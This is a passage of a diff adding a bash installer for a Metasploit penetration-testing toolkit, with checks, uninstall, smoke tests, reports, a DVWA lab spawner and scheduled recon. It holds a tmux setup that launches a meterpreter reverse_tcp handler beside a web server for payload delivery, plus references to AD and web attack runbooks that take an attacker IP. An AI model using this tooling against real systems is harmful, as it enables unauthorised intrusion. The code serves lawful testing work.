+    info "── Disk & RAM ──"
+    check_item "Disk >2GB" '[[ $(df -m "$HOME" 2>/dev/null|awk "NR==2{print \$4}") -gt 2000 ]]' "Need ~2GB free"
+    warn_item "RAM >1GB" '[[ $(awk "/MemTotal/{print \$2}" /proc/meminfo 2>/dev/null||echo 0) -gt 1000000 ]]' "Low RAM"
+    info "── Tools ──"
+    check_item "bash >=4" '[[ ${BASH_VERSINFO[0]:-0} -ge 4 ]]' "Need bash >=4"
+    check_item "git" 'command -v git &>/dev/null' "$PKG_INSTALL git"
+    check_item "curl/wget" 'command -v curl &>/dev/null || command -v wget &>/dev/null' "$PKG_INSTALL curl"
+    info "── Ruby ──"
+    warn_item "ruby >=2.7" 'command -v ruby &>/dev/null && [[ $(ruby -e "puts RUBY_VERSION.to_f" 2>/dev/null||echo 0) >= 2.7 ]]' "$PKG_INSTALL ruby ruby-dev"
+    info "── PostgreSQL ──"
+    warn_item "PostgreSQL" 'command -v psql &>/dev/null || command -v pg_isready &>/dev/null' "$PKG_INSTALL postgresql"
+    info "── Build Tools ──"
+    warn_item "gcc/make" 'command -v gcc &>/dev/null || command -v make &>/dev/null' "$PKG_INSTALL build-essential"
+    info "── Network ──"
+    warn_item "Internet access" 'curl -s --connect-timeout 5 https://github.com &>/dev/null' "No internet"
+    echo ""
+    echo -e "  ${BOLD}Results:${NC} ${GREEN}$pass pass${NC} ${YELLOW}$warn_c warn${NC} ${RED}$fail fail${NC}"
+    [[ $fail -eq 0 ]] || { err "$fail prerequisite(s) missing"; return 1; }
+}
+
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  FEATURE 11: TMUX PENTEST SESSION                                           ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+create_tmux_session() {
+    step "Creating Tmux Pentest Session"
+    if ! cmd_exists tmux; then
+        err "tmux not installed — install it first"
+        return 1
+    fi
+    local SESSION="pentest"
+    if tmux has-session -t "$SESSION" 2>/dev/null; then
+        warn "Session '$SESSION' already exists"
+        ask_yesno "Kill existing & recreate?" "n" && tmux kill-session -t "$SESSION" 2>/dev/null || {
+            info "Attach with: tmux attach -t $SESSION"; return 0
+        }
+    fi
+    # Create 4-pane layout
+    tmux new-session -d -s "$SESSION" -n "msfconsole"
+    tmux send-keys -t "$SESSION:0.0" "echo 'Pane 1: msfconsole'; msfconsole" Enter
+    tmux split-window -h -t "$SESSION:0"
+    tmux send-keys -t "$SESSION:0.1" "echo 'Pane 2: Listener'; use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp" Enter
+    tmux split-window -v -t "$SESSION:0.0"
+    tmux send-keys -t "$SESSION:0.2" "echo 'Pane 3: Web Server (for payload delivery)'; python3 -m http.server 80" Enter
+    tmux split-window -v -t "$SESSION:0.1"
+    tmux send-keys -t "$SESSION:0.3" "echo 'Pane 4: Recon/Enumeration'" Enter
+    tmux select-layout -t "$SESSION" tiled
+    log "Tmux session '$SESSION' created (4 panes)"
+    info "Attach: tmux attach -t $SESSION"
+    info "Kill:   tmux kill-session -t $SESSION"
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  UNINSTALL (Feature 1)                                                      ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+do_uninstall() {
+    banner_box
+    step "UNINSTALL — Removing Everything"
+    warn "This will DELETE: $INSTALL_DIR"
+    warn "           and any MSF data under ~/.msf4"
+    ask_yesno "ARE YOU SURE? This is irreversible" "n" || { info "Aborted."; exit 0; }
+
+    $DRY_RUN && { info "DRY-RUN: would uninstall"; return 0; }
+
+    # Stop services
+    info "Stopping services..."
+    msfdb stop 2>/dev/null || true
+    sudo systemctl stop postgresql 2>/dev/null || true
+    sudo systemctl stop dashboard 2>/dev/null || true
+
+    # Remove install dir
+    if [[ -d "$INSTALL_DIR" ]]; then
+        rm -rf "$INSTALL_DIR" && log "Removed: $INSTALL_DIR" || err "Failed to remove $INSTALL_DIR"
+    fi
+
+    # Remove MSF data
+    [[ -d "$HOME/.msf4" ]] && { rm -rf "$HOME/.msf4"; log "Removed: ~/.msf4"; }
+
+    # Clear cache
+    clear_cache
+
+    # Restore .bashrc backup
+    local latest_bak; latest_bak=$(ls -t "$HOME/.bashrc.bak."* 2>/dev/null | head -1)
+    if [[ -n "$latest_bak" ]]; then
+        cp "$latest_bak" "$HOME/.bashrc" && log "Restored .bashrc from $latest_bak" || warn "Failed to restore .bashrc"
+    fi
+
+    # Remove PATH additions
+    info "Cleaning .bashrc PATH entries..."
+    sed -i '/# metasploit-installer PATH/,/# END metasploit-installer PATH/d' "$HOME/.bashrc" 2>/dev/null || true
+
+    # Remove cron jobs
+    crontab -l 2>/dev/null | grep -v 'metasploit-installer' | crontab - 2>/dev/null || true
+
+    step "Uninstall Complete"
+    info "All traces removed. Goodbye."
+    exit 0
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  HEALTH CHECK & AUTO-REPAIR (Feature 18)                                    ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+do_health_check() {
+    step "Health Check & Auto-Repair"
+    local issues=0 fixes=0
+
+    check_fix() {
+        local label="$1" check="$2" fix="${3:-}"
+        if eval "$check" 2>/dev/null; then log "$label ✓"; else
+            warn "$label ✗ — attempting fix..."; issues=$((issues+1))
+            if [[ -n "$fix" ]]; then eval "$fix" 2>/dev/null && { log "$label FIXED"; fixes=$((fixes+1)); } || err "$label fix FAILED"; fi
+        fi
+    }
+
+    check_fix "msfconsole in PATH" 'command -v msfconsole &>/dev/null' ''
+    check_fix "PostgreSQL running" 'pg_isready -q 2>/dev/null || sudo -u postgres pg_isready -q 2>/dev/null' 'msfdb reinit 2>/dev/null || sudo msfdb reinit 2>/dev/null'
+    check_fix "msfdb connected" 'msfconsole -q -x "db_status; exit" 2>/dev/null | grep -q connected' 'msfdb reinit 2>/dev/null'
+    check_fix "Go bin in PATH" 'echo "$PATH" | grep -q "$HOME/go/bin"' "export PATH=\$HOME/go/bin:\$PATH && echo 'export PATH=\$HOME/go/bin:\$PATH' >> ~/.bashrc"
+    check_fix "pipx bin in PATH" 'echo "$PATH" | grep -q "$HOME/.local/bin"' "export PATH=\$HOME/.local/bin:\$PATH && echo 'export PATH=\$HOME/.local/bin:\$PATH' >> ~/.bashrc"
+    check_fix "nmap available" 'command -v nmap &>/dev/null' ''
+    check_fix "git config ok" 'git config --global user.name &>/dev/null' 'git config --global user.name "Pentester" && git config --global user.email "pentester@localhost"'
+    check_fix "bundler ok" 'command -v bundle &>/dev/null' 'gem install bundler 2>/dev/null'
+    check_fix "ruby >=2.7" 'ruby -e "exit(RUBY_VERSION.to_f>=2.7?0:1)" 2>/dev/null' ''
+
+    echo ""
+    echo -e "  ${BOLD}Health:${NC} $issues issues, $fixes fixed"
+    [[ $issues -gt $fixes ]] && warn "$((issues - fixes)) issue(s) remain — manual intervention needed"
+    [[ $fixes -eq 0 && $issues -eq 0 ]] && log "All systems healthy!"
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  SMOKE TEST (Feature 9)                                                     ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+run_smoke_test() {
+    resume_skip "smoke_test" && return 0
+    step "Smoke Test & Validation"
+    local out="$INSTALL_DIR/smoke_test.md"
+    local pass=0 fail=0
+    mkdir -p "$(dirname "$out")"
+
+    smoke() {
+        local tool="$1" cmd="$2"
+        if eval "$cmd" &>/dev/null; then
+            echo "| $tool | ✅ PASS | $(eval "$cmd" 2>&1 | head -1 | tr -d '\n' | cut -c1-40) |" >> "$out.tmp"
+            log "$tool PASS"; pass=$((pass+1))
+        else
+            echo "| $tool | ❌ FAIL | Not found or failed |" >> "$out.tmp"
+            warn "$tool FAIL"; fail=$((fail+1))
+        fi
+    }
+
+    $DRY_RUN && { info "DRY-RUN: would run smoke tests"; return 0; }
+
+    {
+        echo "# Smoke Test Report — $(date)"
+        echo ""
+        echo "| Tool | Status | Version/Info |"
+        echo "|------|--------|--------------|"
+    } > "$out.tmp"
+
+    smoke "nmap" 'nmap --version 2>&1'
+    smoke "msfconsole" 'msfconsole -q -x "version; exit" 2>&1'
+    smoke "python3" 'python3 --version 2>&1'
+    smoke "go" 'go version 2>&1'
+    smoke "bloodhound" 'bloodhound --version 2>&1 || echo installed'
+    smoke "crackmapexec" 'crackmapexec --version 2>&1 || echo installed'
+    smoke "sqlmap" 'sqlmap --version 2>&1 | head -1'
+    smoke "hydra" 'hydra -h 2>&1 | head -1'
+    smoke "nikto" 'nikto -Version 2>&1'
+    smoke "enum4linux" 'enum4linux 2>&1 | head -1 || echo installed'
+    smoke "impacket" 'python3 -c "import impacket; print(impacket.__version__)" 2>&1 || echo installed'
+    smoke "subfinder" 'subfinder -version 2>&1'
+    smoke "httpx" 'httpx -version 2>&1'
+    smoke "nuclei" 'nuclei -version 2>&1'
+    smoke "tmux" 'tmux -V 2>&1'
+    smoke "git" 'git --version 2>&1'
+
+    cp "$out.tmp" "$out"
+    rm -f "$out.tmp"
+
+    echo "" >> "$out"
+    echo "**Summary:** $pass PASS, $fail FAIL | $(date)" >> "$out"
+
+    echo ""
+    echo -e "  ${BOLD}Smoke Test:${NC} ${GREEN}$pass PASS${NC} ${RED}$fail FAIL${NC}"
+    echo "  Report: $out"
+
+    [[ $fail -eq 0 ]] || warn "Some tools failed — check $out"
+    mark_done "smoke_test"
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  AUTO-REPORT GENERATOR (Feature 6)                                          ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+generate_report() {
+    step "Generating System Report"
+    local report="$INSTALL_DIR/system_report.md"
+    mkdir -p "$(dirname "$report")"
+    $DRY_RUN && { info "DRY-RUN: would generate $report"; return 0; }
+
+    cat > "$report" << RPEOF
+# System Report — $(date -Iseconds)
+
+## Host Info
+| Item | Value |
+|------|-------|
+| Hostname | $(hostname) |
+| Kernel | $(uname -r) |
+| Arch | $(uname -m) |
+| OS | $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '"') |
+| Uptime | $(uptime -p) |
+
+## Network
+| Interface | IP |
+|-----------|----|
+$(ip -4 addr show 2>/dev/null | grep inet | awk '{print "| "$NF" | "$2" |"}' || ifconfig 2>/dev/null | grep "inet " | awk '{print "| "$NF" | "$2" |"}')
+
+## Installed Tools
+$(for t in nmap msfconsole python3 go bloodhound crackmapexec sqlmap hydra nikto enum4linux subfinder httpx nuclei tmux; do
+    echo "- **$t**: $(command -v "$t" 2>/dev/null && ($t --version 2>/dev/null || echo installed) || echo 'NOT FOUND')"
+done)
+
+## Directory Structure
+\`\`\`
+$(find "$INSTALL_DIR" -maxdepth 3 -type d 2>/dev/null | sort | head -50)
+\`\`\`
+
+## Recommended Runbooks
+1. **AD Attack:** \`bash $INSTALL_DIR/runbooks/ad-attack.sh <DOMAIN> <DC_IP> <ATTACKER_IP>\`
+2. **Web Attack:** \`bash $INSTALL_DIR/runbooks/web-attack.sh <URL> <ATTACKER_IP>\`
+3. **Emergency:** \`bash $INSTALL_DIR/runbooks/emergency_breakglass.sh <TARGET> <INTERFACE>\`
+
+## Health Status
+Generated: $(date)
+RPEOF
+    log "Report: $report"
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  BROWSE MODULES (dynamic via find)                                          ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+list_available_modules() {
+    echo ""
+    echo -e "${BOLD}Available Modules:${NC}"
+    echo ""
+    for cat_dir in "$INSTALL_DIR"/modules/*/; do
+        [[ -d "$cat_dir" ]] || continue
+        local cat_name; cat_name="$(basename "$cat_dir")"
+        local count; count=$(find "$cat_dir" -type f -name '*.sh' 2>/dev/null | wc -l)
+        echo -e "  ${CYAN}$cat_name${NC} — $count modules"
+        for sub_dir in "$cat_dir"*/; do
+            [[ -d "$sub_dir" ]] || continue
+            local sub_name; sub_name="$(basename "$sub_dir")"
+            for f in "$sub_dir"*.sh; do
+                [[ -f "$f" ]] || continue
+                local fname desc; fname="$(basename "$f")"
+                desc=$(head -20 "$f" 2>/dev/null | grep -i "^# Description:" | head -1 | cut -d: -f2- | sed 's/^ *//')
+                [[ -z "$desc" ]] && desc="$(head -5 "$f" | grep '^# ' | head -1 | sed 's/^# *//')"
+                echo -e "    ${DIM}$sub_name/${NC}${GREEN}$fname${NC} — ${desc:-module}"
+            done
+        done
+    done
+    echo ""
+}
+
+do_browse_modules() {
+    step "Module Browser (Dynamic Discovery)"
+    list_available_modules
+    info "Run: bash msf-run.sh module <category>/<sub>/<file>"
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  SELF-DIAGNOSTIC (Feature 24: LLM Helper stub)                              ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+run_ai_assistant() {
+    local question="${*:-}"
+    [[ -z "$question" ]] && { read -r -p "  [?] Question: " question; }
+    info "AI Assistant query: $question"
+    if cmd_exists ollama 2>/dev/null; then
+        ollama run llama3 "$question" 2>/dev/null || warn "Ollama failed"
+    elif [[ -n "${OPENAI_API_KEY:-}" ]]; then
+        curl -s https://api.openai.com/v1/chat/completions \
+            -H "Content-Type: application/json" \
+            -H "Authorization: Bearer $OPENAI_API_KEY" \
+            -d "{\"model\":\"gpt-4o-mini\",\"messages\":[{\"role\":\"user\",\"content\":\"$question\"}]}" 2>/dev/null | \
+            python3 -c "import sys,json;print(json.load(sys.stdin)['choices'][0]['message']['content'])" 2>/dev/null || warn "OpenAI API failed"
+    else
+        warn "No AI backend available. Install ollama or set OPENAI_API_KEY in config.env"
+    fi
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  INSTALL METASPLOIT FRAMEWORK                                               ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+do_install_metasploit() {
+    resume_skip "metasploit_installed" && return 0
+    step "Installing Metasploit Framework"
+
+    if cmd_exists msfconsole; then
+        log "msfconsole already installed: $(which msfconsole)"
+        mark_done "metasploit_installed"; return 0
+    fi
+
+    $DRY_RUN && { info "DRY-RUN: would install Metasploit"; return 0; }
+
+    local MSF_CLONE="$HOME/metasploit-framework"
+    if [[ ! -d "$MSF_CLONE" ]]; then
+        info "Cloning metasploit-framework (this takes a while)..."
+        for i in 1 2 3; do
+            git clone --depth=1 https://github.com/rapid7/metasploit-framework.git "$MSF_CLONE" 2>/dev/null && break
+            warn "Clone attempt $i failed — retrying..."
+            sleep 5
+        done
+    fi
+
+    if [[ -d "$MSF_CLONE" ]]; then
+        cd "$MSF_CLONE"
+        gem install bundler 2>/dev/null || true
+        bundle config set --local without 'development test' 2>/dev/null || true
+        for i in 1 2 3; do
+            bundle install --jobs=4 2>&1 | tail -20 && break
+            warn "Bundle attempt $i failed — retrying..."
+            sleep 5
+        done
+        cd - >/dev/null
+        # Link msfconsole into PATH
+        mkdir -p "$HOME/bin"
+        ln -sf "$MSF_CLONE/msfconsole" "$HOME/bin/msfconsole" 2>/dev/null || true
+    fi
+
+    # Initialize database
+    info "Initializing MSF database..."
+    msfdb init 2>/dev/null || sudo msfdb init 2>/dev/null || warn "msfdb init failed — run manually"
+
+    if cmd_exists msfconsole; then
+        log "Metasploit Framework ready"
+        mark_done "metasploit_installed"
+    else
+        warn "Metasploit install incomplete — check logs"
+    fi
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  INSTALL DASHBOARD (Feature 21)                                             ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+install_dashboard() {
+    resume_skip "dashboard_installed" && return 0
+    step "Installing Web Dashboard"
+    info "Installing flask, flask-socketio, eventlet..."
+    pipx install flask 2>/dev/null || python3 -m pip install --user flask flask-socketio eventlet 2>/dev/null || true
+
+    # Create systemd service
+    local service_file="/etc/systemd/system/metasploit-dashboard.service"
+    $DRY_RUN || [[ "$USER_MODE" == "root" || "$USER_MODE" == "sudo" ]] && {
+        cat > /tmp/dashboard.service << 'DASHSVC'
+[Unit]
+Description=Metasploit Dashboard
+After=network.target
+
+[Service]
+Type=simple
+User=%u
+WorkingDirectory=%h/metasploit-installer/dashboard
+ExecStart=%h/.local/bin/python3 app.py
+Restart=on-failure
+RestartSec=10
+
+[Install]
+WantedBy=multi-user.target
+DASHSVC
+        priv_run "cp /tmp/dashboard.service $service_file && systemctl daemon-reload && systemctl enable metasploit-dashboard 2>/dev/null || true"
+    }
+
+    mark_done "dashboard_installed"
+    log "Dashboard installed — start: systemctl start metasploit-dashboard"
+}
+
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  FEATURE 16: MULTI-ARCH + DISTRO ADJUSTMENTS                                ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+apply_arch_distro_fixes() {
+    step "Architecture & Distro Adjustments"
+    info "Arch: $ARCH | Distro: $DISTRO_ID ($DISTRO_FAMILY)"
+
+    case "$DISTRO_ID" in
+        kali)
+            info "Kali Linux detected — optimal pentest environment"
+            ;;
+        parrot)
+            info "Parrot OS detected — optimal pentest environment"
+            ;;
+        ubuntu|debian)
+            info "Standard Linux — installing Kali repo for tools..."
+            $DRY_RUN || {
+                priv_run "wget -qO - https://archive.kali.org/archive-key.asc | sudo apt-key add - 2>/dev/null" || true
+                priv_run "add-apt-repository 'deb https://http.kali.org/kali kali-rolling main non-free contrib' 2>/dev/null" || warn "Kali repo may already be present"
+            }
+            ;;
+        *)
+            info "Non-Kali distro — some tools may need manual install"
+            ;;
+    esac
+
+    case "$ARCH" in
+        aarch64|arm64)
+            warn "ARM architecture — some binaries may not be available"
+            info "Using ARM-compatible binaries where possible"
+            ;;
+        armv7l|arm)
+            warn "32-bit ARM — limited binary support"
+            info "Most tools will need to be built from source"
+            ;;
+    esac
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  SCHEDULED RECON SETUP (Feature 23)                                         ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+setup_scheduled_scan() {
+    step "Scheduled Recon Setup"
+    local scan_script="$INSTALL_DIR/scripts/daily_scan.sh"
+    local telegram_script="$INSTALL_DIR/scripts/telegram_notify.sh"
+    local cron_line="0 2 * * * bash $scan_script >> $INSTALL_DIR/scheduled_report_\$(date +\%Y\%m\%d).log 2>&1"
+
+    if [[ -n "${TELEGRAM_BOT_TOKEN:-}" ]]; then
+        cron_line="0 2 * * * bash $scan_script && bash $telegram_script >> $INSTALL_DIR/scheduled_report_\$(date +\%Y\%m\%d).log 2>&1"
+        info "Telegram notifications enabled"
+    fi
+
+    # Create systemd timer (preferred) or cron fallback
+    if cmd_exists systemctl 2>/dev/null; then
+        local timer_file="/etc/systemd/system/msf-daily-scan.timer"
+        local svc_file="/etc/systemd/system/msf-daily-scan.service"
+        if [[ "$USER_MODE" == "root" || "$USER_MODE" == "sudo" ]]; then
+            cat > /tmp/msf-daily-scan.service << 'SCANSVC'
+[Unit]
+Description=Metasploit Daily Recon Scan
+After=network.target
+
+[Service]
+Type=oneshot
+User=%u
+ExecStart=/bin/bash %h/metasploit-installer/scripts/daily_scan.sh
+SCANSVC
+            cat > /tmp/msf-daily-scan.timer << 'SCANTMR'
+[Unit]
+Description=Daily Metasploit Recon Timer
+
+[Timer]
+OnCalendar=daily
+Persistent=true
+
+[Install]
+WantedBy=timers.target
+SCANTMR
+            priv_run "cp /tmp/msf-daily-scan.service $svc_file && cp /tmp/msf-daily-scan.timer $timer_file && systemctl daemon-reload && systemctl enable msf-daily-scan.timer 2>/dev/null && systemctl start msf-daily-scan.timer 2>/dev/null"
+            log "Systemd timer enabled (daily at 00:00)"
+        fi
+    else
+        (crontab -l 2>/dev/null; echo "$cron_line") | crontab - 2>/dev/null && log "Cron job added (daily 02:00)" || warn "Failed to add cron"
+    fi
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  LAB SPAWNER (Feature 28)                                                   ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+spawn_vuln_lab() {
+    local lab_os="${1:-linux}" vuln="${2:-}"
+    step "Spawning Vulnerable Lab: $lab_os / ${vuln:-default}"
+
+    if ! cmd_exists docker; then
+        err "Docker not installed — run setup.sh --full first"
+        return 1
+    fi
+
+    cd "$INSTALL_DIR/lab"
+    case "$lab_os" in
+        linux)
+            info "Linux targets: Metasploitable2, DVWA, VulnHub"
+            docker pull vulnerables/web-dvwa 2>/dev/null && docker run -d --name dvwa -p 8081:80 vulnerables/web-dvwa 2>/dev/null && log "DVWA started on :8081"
+            ;;
+        windows)
+            info "Windows target (if available): docker pull mcr.microsoft.com/windows/servercore"
+            warn "Windows containers need Windows host — skipping on Linux"
+            ;;
+    esac
+    info "Lab running — access via Docker"
+    docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}" 2>/dev/null | head -10
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  PATH SETUP                                                                ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+setup_path() {
+    resume_skip "path_setup" && return 0
+    step "Setting Up PATH"
+    local bashrc="$HOME/.bashrc"
+    local added=false
+
+    # Backup bashrc first
+    if [[ -f "$bashrc" ]]; then
+        cp "$bashrc" "${bashrc}.bak.$(date +%s)" 2>/dev/null || true
+    fi
+
+    local marker="# metasploit-installer PATH"
+    if ! grep -qF "$marker" "$bashrc" 2>/dev/null; then
+        cat >> "$bashrc" << 'PATHEOF'
+
+# metasploit-installer PATH (auto-generated)
+export PATH="$HOME/go/bin:$HOME/.local/bin:$HOME/bin:$PATH"
+export GOROOT="${GOROOT:-/usr/local/go}"
+# END metasploit-installer PATH
+PATHEOF
+        log "PATH added to ~/.bashrc"
+        added=true
+    else
+        info "PATH already in ~/.bashrc"
+    fi
+
+    export PATH="$HOME/go/bin:$HOME/.local/bin:$HOME/bin:$PATH"
+    $added || info "Run: source ~/.bashrc"
+    mark_done "path_setup"
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  POST-INSTALL: SNAPSHOT DIFF                                               ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+do_snapshot_diff() {
+    resume_skip "snapshot_diff" && return 0
+    take_snapshot "$SNAP_POST"
+    diff_snapshots
+    rm -f "$SNAP_PRE" "$SNAP_POST" 2>/dev/null || true
+    mark_done "snapshot_diff"
+}
+
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  FILE POPULATION — ALL 50+ FILES WITH REAL CONTENT                         ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+populate_all_files() {
+    resume_skip "files_populated" && return 0
+    step "Populating All Files (50+ modules)"
+    local D="$INSTALL_DIR"
+    $DRY_RUN && { info "DRY-RUN: would write all files"; return 0; }
+
+    # ──────────────────────────────────────────────────────────────────
+    # lib/common.sh
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/lib/common.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Shared helpers — colors, logging, privilege, spinner, trap
+# ==============================================================================
+export RED='\033[0;31m'; export GREEN='\033[0;32m'; export YELLOW='\033[1;33m'
+export BLUE='\033[0;34m'; export MAGENTA='\033[0;35m'; export CYAN='\033[0;36m'
+export BOLD='\033[1m'; export DIM='\033[2m'; export NC='\033[0m'
+
+log()   { echo -e "  ${GREEN}[✓]${NC} $*"; }
+info()  { echo -e "  ${BLUE}[*]${NC} $*"; }
+warn()  { echo -e "  ${YELLOW}[!]${NC} $*" >&2; }
+err()   { echo -e "  ${RED}[✗]${NC} $*" >&2; }
+step()  { echo -e "\n${CYAN}${BOLD}═══ $* ═══${NC}\n"; }
+title() { echo -e "${MAGENTA}${BOLD}$*${NC}"; }
+
+print_status()  { echo -e "  ${BLUE}[STATUS]${NC} $*"; }
+print_error()   { echo -e "  ${RED}[ERROR]${NC} $*" >&2; }
+print_success() { echo -e "  ${GREEN}[SUCCESS]${NC} $*"; }
+
+cmd_exists() { command -v "$1" &>/dev/null; }
+is_root() { [[ "${EUID:-$(id -u)}" -eq 0 ]]; }
+has_sudo() { cmd_exists sudo && sudo -n true 2>/dev/null; }
+
+user_mode() { is_root && echo "root" || { has_sudo && echo "sudo" || echo "normal"; }; }
+
+priv_run() {
+    local cmd="$1"
+    case "$(user_mode)" in root) eval "$cmd" ;; sudo) eval "sudo $cmd" ;;
+        normal) eval "$cmd" 2>/dev/null || { warn "Need sudo for: $cmd"; return 1; } ;; esac
+}
+
+ask_yesno() {
+    local prompt="${1:-Continue?}" d="${2:-y}"; local h
+    [[ "$d" == "y" ]] && h="[Y/n]" || h="[y/N]"; local a
+    read -r -p "  [?] $prompt $h: " a; a="${a:-$d}"
+    [[ "${a,,}" == "y" || "${a,,}" == "yes" ]]
+}
+
+confirm_action() {
+    local msg="${1:-Proceed?}"
+    echo -e "  ${YELLOW}[WARN]${NC} $msg"
+    ask_yesno "Continue?" "n" || { info "Aborted."; return 1; }
+}
+
+spinner_pid() { local pid=$1 m="${2:-Working}"; local s="⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
+    while kill -0 "$pid" 2>/dev/null; do for ((i=0;i<${#s};i++)); do
+        printf "\r  ${BLUE}%s${NC} %s" "${s:$i:1}" "$m"; sleep 0.1; done; done
+    printf "\r  ${GREEN}✓${NC} %s Done\n" "$m"; }
+
+backup_file() {
+    local f="$1"; [[ -f "$f" ]] && cp "$f" "${f}.bak.$(date +%s)" && log "Backed up: $f" || true
+}
+
+on_exit_cleanup() {
+    local ec=$?
+    [[ $ec -eq 0 ]] && log "Done." || warn "Exit code: $ec"
+}
+trap on_exit_cleanup EXIT
+
+resolve_path() {
+    local p="$1"; [[ "$p" == /* ]] && echo "$p" || echo "$(cd "$(dirname "$0")" && pwd)/$p"
+}
+EOF
+
+    # ──────────────────────────────────────────────────────────────────
+    # lib/env.sh
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/lib/env.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Environment detection — OS, distro, user, paths
+# ==============================================================================
+script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+source "$script_dir/common.sh" 2>/dev/null || true
+
+detect_os() {
+    export OS_TYPE ARCH; ARCH="$(uname -m)"
+    case "$(uname -s)" in Linux) OS_TYPE="linux" ;; Darwin) OS_TYPE="macos" ;; *) OS_TYPE="other" ;; esac
+
+    if [[ -f /etc/os-release ]]; then source /etc/os-release 2>/dev/null || true; export DISTRO_ID="${ID,,}"; export DISTRO_VERSION="${VERSION_ID:-}"
+    elif [[ -f /etc/arch-release ]]; then export DISTRO_ID="arch"
+    elif cmd_exists termux-info 2>/dev/null; then export DISTRO_ID="termux"
+    else export DISTRO_ID="unknown"; fi
+
+    case "$DISTRO_ID" in
+        ubuntu|debian|kali|parrot|linuxmint|pop|raspbian|zorin) export OS_FAMILY="debian"; export PACKAGE_MANAGER="apt"; export PKG_INSTALL_CMD="sudo apt install -y" ;;
+        fedora|rhel|centos|rocky|alma|oracle) export OS_FAMILY="redhat"; export PACKAGE_MANAGER="dnf"; export PKG_INSTALL_CMD="sudo dnf install -y" ;;
+        arch|manjaro|endeavouros|garuda) export OS_FAMILY="arch"; export PACKAGE_MANAGER="pacman"; export PKG_INSTALL_CMD="sudo pacman -Sy --noconfirm --needed" ;;
+        opensuse*|sles) export OS_FAMILY="suse"; export PACKAGE_MANAGER="zypper"; export PKG_INSTALL_CMD="sudo zypper install -y" ;;
+        termux) export OS_FAMILY="termux"; export PACKAGE_MANAGER="pkg"; export PKG_INSTALL_CMD="pkg install -y" ;;
+        *) export OS_FAMILY="unknown"; export PACKAGE_MANAGER=""; export PKG_INSTALL_CMD="" ;;
+    esac
+    info "OS: $OS_TYPE | Distro: $DISTRO_ID | Family: $OS_FAMILY | Arch: $ARCH"
+}
+
+detect_user() {
+    export CURRENT_USER="$(whoami)"; export HOME_DIR="$HOME"
+    export MY_EUID="${EUID:-$(id -u)}"; export USER_MODE="$(user_mode)"
+    info "User: $CURRENT_USER | Mode: $USER_MODE | Home: $HOME_DIR"
+}
+
+resolve_paths() {
+    export MSF_INSTALL_DIR="${MSF_INSTALL_DIR:-$HOME/metasploit-framework}"
+    export MSF_DIR="${MSF_DIR:-$HOME/.msf4}"
+    export PG_DATA_DIR="${PG_DATA_DIR:-$MSF_DIR/postgres}"
+    export BIN_DIR="${BIN_DIR:-$HOME/bin}"
+    export STATE_FILE="${STATE_FILE:-$HOME/.msf-setup-state}"
+}
+
+detect_all() { detect_os; detect_user; resolve_paths; }
+EOF
+
+    # ──────────────────────────────────────────────────────────────────
+    # lib/checker.sh
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/lib/checker.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Pre-flight checker — validates all prerequisites
+# ==============================================================================
+set -euo pipefail
+script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+source "$script_dir/common.sh" 2>/dev/null || true
+source "$script_dir/env.sh" 2>/dev/null || true
+detect_all 2>/dev/null || true
+
+check_root() {
+    if is_root; then warn "Running as ROOT — PostgreSQL initdb will FAIL"
+        info "SOLUTION: useradd -m msfuser && su - msfuser"
+    fi
+}
+
+check_internet() {
+    info "Checking internet connectivity..."
+    if curl -s --connect-timeout 5 https://github.com >/dev/null 2>&1; then log "Internet: OK"
+    elif wget -q --timeout=5 -O /dev/null https://github.com 2>&1; then log "Internet: OK (wget)"
+    else err "No internet access to github.com"; return 1; fi
+}
+
+check_dependency() {
+    local tool="$1" hint="${2:-}"
+    cmd_exists "$tool" && { log "$tool: $(command -v "$tool")"; return 0; }
+    err "$tool: NOT FOUND"; [[ -n "$hint" ]] && info "Install: $hint"
+    return 1
+}
+
+check_os() {
+    info "Checking OS compatibility..."
